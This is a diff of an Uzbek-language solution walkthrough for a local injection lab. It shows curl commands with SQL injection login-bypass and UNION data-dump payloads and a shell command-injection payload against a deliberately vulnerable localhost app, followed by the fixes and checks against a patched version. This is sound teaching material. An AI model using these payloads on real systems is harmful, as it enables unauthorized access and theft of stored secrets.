@@ -4,7 +4,7 @@
 
 Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.
 
-Quyidagi barcha soʻrovlar vulnerable ga tegishli (port 8041).
+Quyidagi barcha soʻrovlar vulnerable ga tegishli (port 8041). Brauzerda yuklamalar xuddi shu maydonlarga qoʻyiladi — sayt va `/ui` bir xil natijani koʻrsatadi.
 
 ## 1. Kirishni aylanib oʻtish
 
@@ -26,73 +26,78 @@ curl -H 'Content-Type: application/json' \
 # → admin sifatida kirish va FLAG{a05_sqli_login_bypass}
 ```
 
-Boshqa variant: login `nobody' OR '1'='1' --`, shart doim rost boʻlib qoladi va kirish jadvaldagi birinchi foydalanuvchi nomidan bajariladi.
+Admin sifatida kirganingizda `GET /me` ham shu flagni qaytaradi (brauzerda `/admin` ni oching).
 
-## 2. Yashirin mahsulot
+Boshqa variant: login `nobody' OR '1'='1' --`, shart doim rost boʻlib qoladi va kirish jadvaldagi birinchi foydalanuvchidan bajariladi.
 
-```sql
-SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
-```
+## 2. Yashirin charter reys
+
+Qidiruv soʻrovida `AND hidden = 0` bor. Tirnoq bilan `OR 1=1` shartni doim rost qiladi, `--` esa qolganini tashlab yuboradi:
 
 ```bash
-curl -G http://127.0.0.1:8041/products --data-urlencode "q=%' OR 1=1 --"
-# javobda FLAG{a05_hidden_product} bilan yashirin mahsulot paydo boʻladi
+curl -G http://127.0.0.1:8041/flights \
+  --data-urlencode "from=" --data-urlencode "to=%' OR 1=1 --"
+# → oddiy reyslar orasida «SK 900» — charter paydo boʻladi
 ```
 
-`OR 1=1` shartni rost qiladi, `--` esa `AND hidden = 0` ni tashlab yuboradi.
+Uni oching: `GET /flight/6` — «Izoh» maydonida `FLAG{a05_hidden_flight}` turibdi.
+
+`to='` ni davomisiz sinab koʻring: sahifa SQL xatosi matnini qaytaradi (`unrecognized token`). Bunday xatolar hujumchiga soʻrov tuzilishini tushunishga yordam beradi, shuning uchun ularni foydalanuvchiga koʻrsatib boʻlmaydi. Yana bir misol: `max_price=abc` → `no such column: abc`.
 
 ## 3. UNION: boshqa jadvaldan maʼlumotlar
 
-Dastlabki soʻrov uchta ustun (`id`, `name`, `price`) qaytaradi, shuning uchun `UNION SELECT` da ham ular uchta boʻlishi kerak:
+Qidiruv 7 ustun qaytaradi (`id, flight_no, origin, destination, dep_date, dep_time, price`), demak `UNION SELECT` ham aynan 7 ta qaytarishi kerak:
 
 ```bash
-curl -G http://127.0.0.1:8041/products \
-  --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"
-# name maydonida: admin, price maydonida: FLAG{a05_sqli_union_dump}
+curl -G http://127.0.0.1:8041/flights --data-urlencode "from=" \
+  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
+# → flight_no da foydalanuvchi nomi, destination da sir:
+#   admin -> FLAG{a05_sqli_union_dump}
 ```
 
-`q='` ni davomisiz sinab koʻring: ilova SQL xatosi matnini qaytaradi. Bunday xatolar hujumchiga soʻrov tuzilishini tushunishga yordam beradi, shuning uchun ularni foydalanuvchiga koʻrsatib boʻlmaydi.
+Brauzerda soxta «reyslar» xuddi shu roʻyxatda koʻrinadi: `admin → FLAG{...}`.
 
-## 4. XSS
+## 4. Tugun tekshiruvidagi command injection
 
-**Qaytarilgan.** Skript parametrda keladi va darhol sahifaga tushadi. Brauzerda oching:
-
-```
-http://127.0.0.1:8041/search?q=<script>alert(1)</script>
-```
-
-**Saqlanuvchi.** Skript serverda saqlanadi va sahifani ochgan har kimda bajariladi:
+Avval admin sessiyasini oling (1-bosqich), soʻng shell ajratuvchisi bilan host yuboring:
 
 ```bash
-curl -H 'Content-Type: application/json' \
-  -d '{"name":"x","message":"<script>alert(1)</script>"}' http://127.0.0.1:8041/guestbook
+curl -s -c jar.txt -H 'Content-Type: application/json' \
+  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
+curl -s -b jar.txt -H 'Content-Type: application/json' \
+  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8041/admin/check
+# → {"output":"FLAG{a05_command_injection}\n"}
 ```
 
-Soʻng brauzerda http://127.0.0.1:8041/guestbook ni oching. Real tizimda `alert(1)` oʻrnida foydalanuvchi maʼlumotlarini oʻgʻirlaydigan kod boʻlishi mumkin edi, XSS shuning uchun xavfli.
-
-Mehmonlar kitobi ilova xotirasida saqlanadi va qayta ishga tushirilganda tozalanadi.
+Ilova `ping -c 1 <host>` ni `os.popen`, ya'ni shell orqali bajaradi, shuning uchun `;` ikkinchi buyruqni ishga tushiradi — flag esa jarayon muhitida (`A05_FLAG`) turadi va uni shell koʻradi. Windows da ajratuvchi `&`, oʻzgaruvchi esa `%A05_FLAG%` koʻrinishida. Brauzerda: `/admin` → «Aeroport tuguni tekshiruvi» → host `localhost; echo $A05_FLAG`.
 
 ## Tuzatishlar (fixed, port 8042)
 
 | Muammo | Tuzatish |
 |--------|----------|
-| SQL da qatorlarni yopishtirish (kirish, qidiruv) | Parametrlangan soʻrovlar: `... WHERE username = ?`, `... LIKE ?` |
-| Ekranlashsiz chiqarish (qidiruv, mehmonlar kitobi) | Chiqarishda `markupsafe.escape`: `<` `&lt;` ga aylanadi |
-| Chuqurlashtirilgan himoya yoʻq | `Content-Security-Policy: default-src 'none'` sarlavhasi skriptlar bajarilishini taqiqlaydi, maydonlar uzunligi cheklangan |
-| Parolni SQL ichida solishtirish | Parol kodda `hmac.compare_digest` orqali solishtiriladi |
-| Javobda BD xatosi matni | SQL xatosi endi yuzaga kelmaydi, soʻrovlar kiritishga bogʻliq emas |
+| SQL da qatorlarni yopishtirish (kirish, qidiruv) | Parametrlangan soʻrovlar: `... WHERE username = ?`, `origin LIKE ?`; qiymatlar uzunlik va format boʻyicha cheklangan |
+| `hidden = 0` `OR 1=1` bilan zararsizlanadi | Shart va qiymatlar soʻrovning turli qismlarida — maʼlumot tuzilishni oʻzgartira olmaydi |
+| Javobda BD xatosi matni | SQL xatosi endi yuzaga kelmaydi, koʻrsatilgan xabar umumiy boʻladi |
+| Foydalanuvchi kiritganidan buyruq satri | Shell umuman yoʻq: host `^[A-Za-z0-9.-]+$` ga mos boʻlishi kerak va `socket.gethostbyname` orqali aniqlanadi |
+| Jarayon muhitidagi flag | Tuzatilgan versiya sirni muhitga qoʻymaydi |
 
 fixed da tekshirish (port 8042):
 
 ```bash
 curl -H 'Content-Type: application/json' \
-  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login         # 401
-curl -G http://127.0.0.1:8042/products --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"   # []
-curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # javobda &lt;script&gt;...
+  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login        # 401
+curl -G http://127.0.0.1:8042/flights --data-urlencode "from=" \
+  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
+# → 0 ta qator: yuklama oddiy sifatida qidiriladi
+curl -s -c jar.txt -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"Adm1n-lab-pass"}' http://127.0.0.1:8042/login
+curl -s -b jar.txt -H 'Content-Type: application/json' \
+  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8042/admin/check
+# → invalid host: 'localhost; echo $A05_FLAG' (allowed: letters, digits, dot, dash)
 ```
 
 ## Yana nimani esda tutish kerak
-- Ekranlash kontekstga bogʻliq (HTML, atribut, JavaScript, URL), shuning uchun avtomatik ekranlashli shablonizatordan foydalangan maʼqul.
 - Parametrlash qiymatlarni himoya qiladi, lekin jadval va ustun nomlarini emas: ularni kiritishdan qoʻyib boʻlmaydi, faqat oq roʻyxatdan.
-- Inyeksiyalar faqat SQL va HTML da emas: OT buyruqlari, LDAP, NoSQL-soʻrovlar ham bor. Tamoyil hamma joyda bitta: maʼlumotni kod bilan aralashtirib boʻlmaydi.
-- Bu laboratoriyada parollar faqat soddalik uchun ochiq matnda saqlanadi. Parollarni saqlash haqida A04 laboratoriyasiga qarang.
+- Inyeksiyalar faqat SQL da emas: OT buyruqlari, LDAP, NoSQL-soʻrovlar, log yozuvlari. Tamoyil hamma joyda bitta: maʼlumotni kod bilan aralashtirib boʻlmaydi.
+- Kiritishni tekshirish — qora roʻyxat emas, oq roʻyxat: «nuqtali vergul yoʻq» degan qoida `$IFS`, qator oʻzgarishi va boshqa oʻnlab hiylalarga yutqazadi.
+- Kirish aylanib oʻtishi shundaki, parol SQL *ichida* tekshirilgan. Sirlarni ilova kodida solishtiring (saqlash haqida A04 laboratoriyasiga qarang).
